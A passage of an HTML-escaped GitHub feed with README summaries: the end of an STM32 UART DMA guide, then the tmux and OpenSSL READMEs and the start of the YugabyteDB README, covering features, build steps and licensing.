(processed) in the interrupt. We strive to execute interrupt routine as fast as possible&lt;/li&gt; &#xA; &lt;li&gt;C: Long interrupt execution may break other compatibility in the application&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;em&gt;Processing of incoming data is from 2 interrupt vectors, hence it is important that they do not preempt each-other. Set both to the same preemption priority!&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;USART Idle line detection + DMA HT&amp;amp;TC interrupts with RTOS&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Application gets notification by IDLE line detection or DMA TC/HT events&lt;/li&gt; &#xA; &lt;li&gt;Application uses separate thread to process the data only when notified in one of interrupts&lt;/li&gt; &#xA; &lt;li&gt;P: Processing is not in the interrupt but in separate thread&lt;/li&gt; &#xA; &lt;li&gt;P: Interrupt only informs processing thread to process (or to wakeup)&lt;/li&gt; &#xA; &lt;li&gt;P: Operating system may put processing thread to blocked state while waiting for event&lt;/li&gt; &#xA; &lt;li&gt;C: Memory usage for separate thread + message queue (or semaphore)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;This is the most preferred way to use and process UART received character&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Examples for UART DMA for TX (and optionally included RX)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Application is using DMA in normal mode to transfer data&lt;/li&gt; &#xA; &lt;li&gt;Application is always using ringbuffer between high-level write and low-level transmit operation&lt;/li&gt; &#xA; &lt;li&gt;DMA TC interrupt is triggered when transfer has finished. Application can then send more data&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Demo application for debug messages&lt;/h3&gt; &#xA;&lt;p&gt;This is a demo application available in &lt;code&gt;projects&lt;/code&gt; folder. Its purpose is to show how can application implement output of debug messages without drastically affect CPU performance. It is using DMA to transfer data (no CPU to wait for UART flags) and can achieve very high or very low data rates&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;All debug messages from application are written to intermediate ringbuffer&lt;/li&gt; &#xA; &lt;li&gt;Application will try to start &amp;amp; configure DMA after every successfive write to ringbuffer&lt;/li&gt; &#xA; &lt;li&gt;If transfer is on-going, next start is configured from DMA TC interrupt&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;As a result of this demo application for STM32F413-Nucleo board, observations are as following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Demo code sends &lt;code&gt;1581&lt;/code&gt; bytes every second at &lt;code&gt;115200&lt;/code&gt; bauds, which is approx &lt;code&gt;142ms&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;With DMA disabled, CPU load was &lt;code&gt;14%&lt;/code&gt;, in-line with time to transmit the data&lt;/li&gt; &#xA; &lt;li&gt;With DMA enabled, CPU load was &lt;code&gt;0%&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;DMA can be enabled/disabled with &lt;code&gt;USE_DMA_TX&lt;/code&gt; macro configuration in &lt;code&gt;main.c&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How to use this repository&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;run &lt;code&gt;git clone --recurse-submodules https://github.com/MaJerle/stm32-usart-dma-rx-tx&lt;/code&gt; to clone repository including submodules&lt;/li&gt; &#xA; &lt;li&gt;run examples from &lt;code&gt;projects&lt;/code&gt; directory using &lt;a href=&#34;https://www.st.com/en/development-tools/stm32cubeide.html&#34;&gt;STM32CubeIDE IDE&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt;</summary>
  </entry>
  <entry>
    <title>tmux/tmux</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/tmux/tmux</id>
    <link href="https://github.com/tmux/tmux" rel="alternate"></link>
    <summary type="html">&lt;p&gt;tmux source code&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Welcome to tmux!&lt;/h1&gt; &#xA;&lt;p&gt;tmux is a terminal multiplexer: it enables a number of terminals to be created, accessed, and controlled from a single screen. tmux may be detached from a screen and continue running in the background, then later reattached.&lt;/p&gt; &#xA;&lt;p&gt;This release runs on OpenBSD, FreeBSD, NetBSD, Linux, macOS and Solaris.&lt;/p&gt; &#xA;&lt;h2&gt;Dependencies&lt;/h2&gt; &#xA;&lt;p&gt;tmux depends on &lt;a href=&#34;https://libevent.org&#34;&gt;libevent&lt;/a&gt; 2.x, available from &lt;a href=&#34;https://github.com/libevent/libevent/releases/latest&#34;&gt;this page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;It also depends on &lt;a href=&#34;https://www.gnu.org/software/ncurses/&#34;&gt;ncurses&lt;/a&gt;, available from &lt;a href=&#34;https://invisible-mirror.net/archives/ncurses/&#34;&gt;this page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To build tmux, a C compiler (for example gcc or clang), make, pkg-config and a suitable yacc (yacc or bison) are needed.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;h3&gt;Binary packages&lt;/h3&gt; &#xA;&lt;p&gt;Some platforms provide binary packages for tmux, although these are sometimes out of date. Examples are listed on &lt;a href=&#34;https://github.com/tmux/tmux/wiki/Installing&#34;&gt;this page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;From release tarball&lt;/h3&gt; &#xA;&lt;p&gt;To build and install tmux from a release tarball, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./configure &amp;amp;&amp;amp; make&#xA;sudo make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;tmux can use the utempter library to update utmp(5), if it is installed - run configure with &lt;code&gt;--enable-utempter&lt;/code&gt; to enable this.&lt;/p&gt; &#xA;&lt;p&gt;For more detailed instructions on building and installing tmux, see &lt;a href=&#34;https://github.com/tmux/tmux/wiki/Installing&#34;&gt;this page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;From version control&lt;/h3&gt; &#xA;&lt;p&gt;To get and build the latest from version control - note that this requires &lt;code&gt;autoconf&lt;/code&gt;, &lt;code&gt;automake&lt;/code&gt; and &lt;code&gt;pkg-config&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/tmux/tmux.git&#xA;cd tmux&#xA;sh autogen.sh&#xA;./configure &amp;amp;&amp;amp; make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Bug reports, feature suggestions and especially code contributions are most welcome. Please send by email to:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;mailto:tmux-users@googlegroups.com&#34;&gt;tmux-users@googlegroups.com&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Or open a GitHub issue or pull request. &lt;strong&gt;Please read &lt;a href=&#34;https://raw.githubusercontent.com/tmux/tmux/master/CONTRIBUTING.md&#34;&gt;this document&lt;/a&gt; before opening an issue.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;There is &lt;a href=&#34;https://github.com/tmux/tmux/wiki/Contributing&#34;&gt;a list of suggestions for contributions&lt;/a&gt;. Please feel free to ask on the mailing list if you&#39;re thinking of working on something or need further information.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;For documentation on using tmux, see the tmux.1 manpage. View it from the source tree with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nroff -mdoc tmux.1|less&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A small example configuration is in &lt;code&gt;example_tmux.conf&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;And a bash(1) completion file at:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/imomaliev/tmux-bash-completion&#34;&gt;https://github.com/imomaliev/tmux-bash-completion&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For debugging, run tmux with &lt;code&gt;-v&lt;/code&gt; or &lt;code&gt;-vv&lt;/code&gt; to generate server and client log files in the current directory.&lt;/p&gt; &#xA;&lt;h2&gt;Support&lt;/h2&gt; &#xA;&lt;p&gt;The tmux mailing list for general discussion and bug reports is:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://groups.google.com/forum/#!forum/tmux-users&#34;&gt;https://groups.google.com/forum/#!forum/tmux-users&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Subscribe by sending an email to:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;mailto:tmux-users+subscribe@googlegroups.com&#34;&gt;tmux-users+subscribe@googlegroups.com&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>openssl/openssl</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/openssl/openssl</id>
    <link href="https://github.com/openssl/openssl" rel="alternate"></link>
    <summary type="html">&lt;p&gt;TLS/SSL and crypto library&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Welcome to the OpenSSL Project&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.openssl.org&#34; title=&#34;OpenSSL Homepage&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/openssl/openssl/master/doc/images/openssl.svg?sanitize=true&#34; alt=&#34;openssl logo&#34; title=&#34;OpenSSL Logo&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/openssl/openssl/actions?query=workflow%3A%22GitHub+CI%22&#34; title=&#34;GitHub Actions CI&#34;&gt;&lt;img src=&#34;https://github.com/openssl/openssl/workflows/GitHub%20CI/badge.svg?sanitize=true&#34; alt=&#34;github actions ci badge&#34; title=&#34;GitHub Actions CI Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ci.appveyor.com/project/openssl/openssl/branch/master&#34; title=&#34;AppVeyor Jobs&#34;&gt;&lt;img src=&#34;https://ci.appveyor.com/api/projects/status/8e10o7xfrg73v98f/branch/master?svg=true&#34; alt=&#34;appveyor badge&#34; title=&#34;AppVeyor Build Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;OpenSSL is a robust, commercial-grade, full-featured Open Source Toolkit for the Transport Layer Security (TLS) protocol formerly known as the Secure Sockets Layer (SSL) protocol. The protocol implementation is based on a full-strength general purpose cryptographic library, which can also be used stand-alone.&lt;/p&gt; &#xA;&lt;p&gt;OpenSSL is descended from the SSLeay library developed by Eric A. Young and Tim J. Hudson.&lt;/p&gt; &#xA;&lt;p&gt;The official Home Page of the OpenSSL Project is &lt;a href=&#34;https://www.openssl.org&#34; title=&#34;OpenSSL Homepage&#34;&gt;www.openssl.org&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Table of Contents&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/#overview&#34;&gt;Overview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/#download&#34;&gt;Download&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/#build-and-install&#34;&gt;Build and Install&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/#documentation&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/#support&#34;&gt;Support&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/#legalities&#34;&gt;Legalities&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Overview&lt;/h1&gt; &#xA;&lt;p&gt;The OpenSSL toolkit includes:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;libssl&lt;/strong&gt; an implementation of all TLS protocol versions up to TLSv1.3 (&lt;a href=&#34;https://tools.ietf.org/html/rfc8446&#34;&gt;RFC 8446&lt;/a&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;libcrypto&lt;/strong&gt; a full-strength general purpose cryptographic library. It constitutes the basis of the TLS implementation, but can also be used independently.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;openssl&lt;/strong&gt; the OpenSSL command line tool, a swiss army knife for cryptographic tasks, testing and analyzing. It can be used for&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;creation of key parameters&lt;/li&gt; &#xA;   &lt;li&gt;creation of X.509 certificates, CSRs and CRLs&lt;/li&gt; &#xA;   &lt;li&gt;calculation of message digests&lt;/li&gt; &#xA;   &lt;li&gt;encryption and decryption&lt;/li&gt; &#xA;   &lt;li&gt;SSL/TLS client and server tests&lt;/li&gt; &#xA;   &lt;li&gt;handling of S/MIME signed or encrypted mail&lt;/li&gt; &#xA;   &lt;li&gt;and more...&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Download&lt;/h1&gt; &#xA;&lt;h2&gt;For Production Use&lt;/h2&gt; &#xA;&lt;p&gt;Source code tarballs of the official releases can be downloaded from &lt;a href=&#34;https://www.openssl.org/source&#34;&gt;www.openssl.org/source&lt;/a&gt;. The OpenSSL project does not distribute the toolkit in binary form.&lt;/p&gt; &#xA;&lt;p&gt;However, for a large variety of operating systems precompiled versions of the OpenSSL toolkit are available. In particular on Linux and other Unix operating systems it is normally recommended to link against the precompiled shared libraries provided by the distributor or vendor.&lt;/p&gt; &#xA;&lt;h2&gt;For Testing and Development&lt;/h2&gt; &#xA;&lt;p&gt;Although testing and development could in theory also be done using the source tarballs, having a local copy of the git repository with the entire project history gives you much more insight into the code base.&lt;/p&gt; &#xA;&lt;p&gt;The official OpenSSL Git Repository is located at &lt;a href=&#34;https://git.openssl.org&#34; title=&#34;OpenSSL Git Repository&#34;&gt;git.openssl.org&lt;/a&gt;. There is a GitHub mirror of the repository at &lt;a href=&#34;https://github.com/openssl/openssl&#34; title=&#34;OpenSSL GitHub Mirror&#34;&gt;github.com/openssl/openssl&lt;/a&gt;, which is updated automatically from the former on every commit.&lt;/p&gt; &#xA;&lt;p&gt;A local copy of the Git Repository can be obtained by cloning it from the original OpenSSL repository using&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone git://git.openssl.org/openssl.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or from the GitHub mirror using&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/openssl/openssl.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you intend to contribute to OpenSSL, either to fix bugs or contribute new features, you need to fork the OpenSSL repository openssl/openssl on GitHub and clone your public fork instead.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/yourname/openssl.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This is necessary, because all development of OpenSSL nowadays is done via GitHub pull requests. For more details, see &lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/#contributing&#34;&gt;Contributing&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Build and Install&lt;/h1&gt; &#xA;&lt;p&gt;After obtaining the Source, have a look at the &lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/INSTALL.md&#34;&gt;INSTALL&lt;/a&gt; file for detailed instructions about building and installing OpenSSL. For some platforms, the installation instructions are amended by a platform specific document.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/NOTES-UNIX.md&#34;&gt;Notes for UNIX-like platforms&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/NOTES-ANDROID.md&#34;&gt;Notes for Android platforms&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/NOTES-WINDOWS.md&#34;&gt;Notes for Windows platforms&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/NOTES-DJGPP.md&#34;&gt;Notes for the DOS platform with DJGPP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/NOTES-VMS.md&#34;&gt;Notes for the OpenVMS platform&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/NOTES-PERL.md&#34;&gt;Notes on Perl&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/NOTES-VALGRIND.md&#34;&gt;Notes on Valgrind&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Specific notes on upgrading to OpenSSL 3.0 from previous versions can be found in the &lt;a href=&#34;https://www.openssl.org/docs/manmaster/man7/migration_guide.html&#34; title=&#34;OpenSSL Migration Guide&#34;&gt;migration_guide(7ossl)&lt;/a&gt; manual page.&lt;/p&gt; &#xA;&lt;h1&gt;Documentation&lt;/h1&gt; &#xA;&lt;h2&gt;Manual Pages&lt;/h2&gt; &#xA;&lt;p&gt;The manual pages for the master branch and all current stable releases are available online.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.openssl.org/docs/manmaster&#34;&gt;OpenSSL master&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.openssl.org/docs/man3.0&#34;&gt;OpenSSL 3.0&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.openssl.org/docs/man1.1.1&#34;&gt;OpenSSL 1.1.1&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Wiki&lt;/h2&gt; &#xA;&lt;p&gt;There is a Wiki at &lt;a href=&#34;https://wiki.openssl.org&#34; title=&#34;OpenSSL Wiki&#34;&gt;wiki.openssl.org&lt;/a&gt; which is currently not very active. It contains a lot of useful information, not all of which is up to date.&lt;/p&gt; &#xA;&lt;h1&gt;License&lt;/h1&gt; &#xA;&lt;p&gt;OpenSSL is licensed under the Apache License 2.0, which means that you are free to get and use it for commercial and non-commercial purposes as long as you fulfill its conditions.&lt;/p&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/LICENSE.txt&#34;&gt;LICENSE.txt&lt;/a&gt; file for more details.&lt;/p&gt; &#xA;&lt;h1&gt;Support&lt;/h1&gt; &#xA;&lt;p&gt;There are various ways to get in touch. The correct channel depends on your requirement. see the &lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/SUPPORT.md&#34;&gt;SUPPORT&lt;/a&gt; file for more details.&lt;/p&gt; &#xA;&lt;h1&gt;Contributing&lt;/h1&gt; &#xA;&lt;p&gt;If you are interested and willing to contribute to the OpenSSL project, please take a look at the &lt;a href=&#34;https://raw.githubusercontent.com/openssl/openssl/master/CONTRIBUTING.md&#34;&gt;CONTRIBUTING&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;h1&gt;Legalities&lt;/h1&gt; &#xA;&lt;p&gt;A number of nations restrict the use or export of cryptography. If you are potentially subject to such restrictions you should seek legal advice before attempting to develop or distribute cryptographic code.&lt;/p&gt; &#xA;&lt;h1&gt;Copyright&lt;/h1&gt; &#xA;&lt;p&gt;Copyright (c) 1998-2022 The OpenSSL Project&lt;/p&gt; &#xA;&lt;p&gt;Copyright (c) 1995-1998 Eric A. Young, Tim J. Hudson&lt;/p&gt; &#xA;&lt;p&gt;All rights reserved.&lt;/p&gt; &#xA;&lt;!-- Links  --&gt; &#xA;&lt;!-- Logos and Badges --&gt;</summary>
  </entry>
  <entry>
    <title>yugabyte/yugabyte-db</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/yugabyte/yugabyte-db</id>
    <link href="https://github.com/yugabyte/yugabyte-db" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The high-performance distributed SQL database for global, internet-scale apps.&lt;/p&gt;&lt;hr&gt;&lt;img src=&#34;https://www.yugabyte.com/wp-content/themes/yugabyte/assets/images/yugabyteDB-site-logo-new-blue.svg?sanitize=true&#34; align=&#34;center&#34; alt=&#34;YugabyteDB&#34; width=&#34;50%&#34;&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opensource.org/licenses/Apache-2.0&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-Apache%202.0-blue.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://docs.yugabyte.com/&#34;&gt;&lt;img src=&#34;https://readthedocs.org/projects/ansicolortags/badge/?version=latest&#34; alt=&#34;Documentation Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://forum.yugabyte.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/ask%20us-forum-orange.svg?sanitize=true&#34; alt=&#34;Ask in forum&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://communityinviter.com/apps/yugabyte-db/register&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Slack:-%23yugabyte_db-blueviolet.svg?logo=slack&#34; alt=&#34;Slack chat&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/yugabyte/ga-beacon&#34;&gt;&lt;img src=&#34;https://yugabyte.appspot.com/UA-104956980-4/home?pixel&amp;amp;useReferer&#34; alt=&#34;Analytics&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;What is YugabyteDB?&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;YugabyteDB&lt;/strong&gt; is a &lt;strong&gt;high-performance, cloud-native distributed SQL database&lt;/strong&gt; that aims to support &lt;strong&gt;all PostgreSQL features&lt;/strong&gt;. It is best to fit for &lt;strong&gt;cloud-native OLTP (i.e. real-time, business-critical) applications&lt;/strong&gt; that need absolute &lt;strong&gt;data correctness&lt;/strong&gt; and require at least one of the following: &lt;strong&gt;scalability, high tolerance to failures, or globally-distributed deployments.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/#core-features&#34;&gt;Core Features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/#get-started&#34;&gt;Get Started&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/#build-apps&#34;&gt;Build Apps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/#whats-being-worked-on&#34;&gt;What&#39;s being worked on?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/#architecture&#34;&gt;Architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/#need-help&#34;&gt;Need Help?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/#contribute&#34;&gt;Contribute&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/yugabyte/yugabyte-db/master/#read-more&#34;&gt;Read More&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Core Features&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Powerful RDBMS capabilities&lt;/strong&gt; Yugabyte SQL (&lt;em&gt;YSQL&lt;/em&gt; for short) reuses the query layer of PostgreSQL (similar to Amazon Aurora PostgreSQL), thereby supporting most of its features (datatypes, queries, expressions, operators and functions, stored procedures, triggers, extensions, etc). Here is a detailed &lt;a href=&#34;https://docs.yugabyte.com/preview/explore/ysql-language-features/postgresql-compatibility/&#34;&gt;list of features currently supported by YSQL&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Distributed transactions&lt;/strong&gt; The transaction design is based on the Google Spanner architecture. Strong consistency of writes is achieved by using Raft consensus for replication and cluster-wide distributed ACID transactions using &lt;em&gt;hybrid logical clocks&lt;/em&gt;. &lt;em&gt;Snapshot&lt;/em&gt;, &lt;em&gt;serializable&lt;/em&gt; and &lt;em&gt;read committed&lt;/em&gt; isolation levels are supported. Reads (queries) have strong consistency by default, but can be tuned dynamically to read from followers and read-replicas.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Continuous availability&lt;/strong&gt; YugabyteDB is extremely resilient to common outages with native failover and repair. YugabyteDB can be configured to tolerate disk, node, zone, region, and cloud failures automatically. For a typical deployment where a YugabyteDB cluster is deployed in one region across multiple zones on a public cloud, the RPO is 0 (meaning no data is lost on failure) and the RTO is 3 seconds (meaning the data being served by the failed node is available in 3 seconds).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Horizontal scalability&lt;/strong&gt; Scaling a YugabyteDB cluster to achieve more IOPS or data storage is as simple as adding nodes to the cluster.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Geo-distributed, multi-cloud&lt;/strong&gt; YugabyteDB can be deployed in public clouds and natively inside Kubernetes. It supports deployments that span three or more fault domains, such as multi-zone, multi-region, and multi-cloud deployments. It also supports xCluster asynchronous replication with unidirectional master-slave and bidirectional multi-master configurations that can be leveraged in two-region deployments. To serve (stale) data with low latencies, read replicas are also a supported feature.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Multi API design&lt;/strong&gt; The query layer of YugabyteDB is built to be extensible. Currently, YugabyteDB supports two distributed SQL APIs: &lt;strong&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/api/ysql/&#34;&gt;Yugabyte SQL (YSQL)&lt;/a&gt;&lt;/strong&gt;, a fully relational API that re-uses query layer of PostgreSQL, and &lt;strong&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/api/ycql/&#34;&gt;Yugabyte Cloud QL (YCQL)&lt;/a&gt;&lt;/strong&gt;, a semi-relational SQL-like API with documents/indexing support with Apache Cassandra QL roots.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;100% open source&lt;/strong&gt; YugabyteDB is fully open-source under the &lt;a href=&#34;https://github.com/yugabyte/yugabyte-db/raw/master/LICENSE.md&#34;&gt;Apache 2.0 license&lt;/a&gt;. The open-source version has powerful enterprise features such as distributed backups, encryption of data-at-rest, in-flight TLS encryption, change data capture, read replicas, and more.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Read more about YugabyteDB in our &lt;a href=&#34;https://docs.yugabyte.com/latest/introduction/&#34;&gt;Docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Get Started&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/install/&#34;&gt;Install YugabyteDB&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/create-local-cluster/&#34;&gt;Create a local cluster&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.yugabyte.com/cloud/&#34;&gt;Start with Yugabyte Cloud&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/explore-ysql/&#34;&gt;Connect and try out SQL commands&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.yugabyte.com/latest/quick-start/build-apps/&#34;&gt;Build an app&lt;/a&gt; 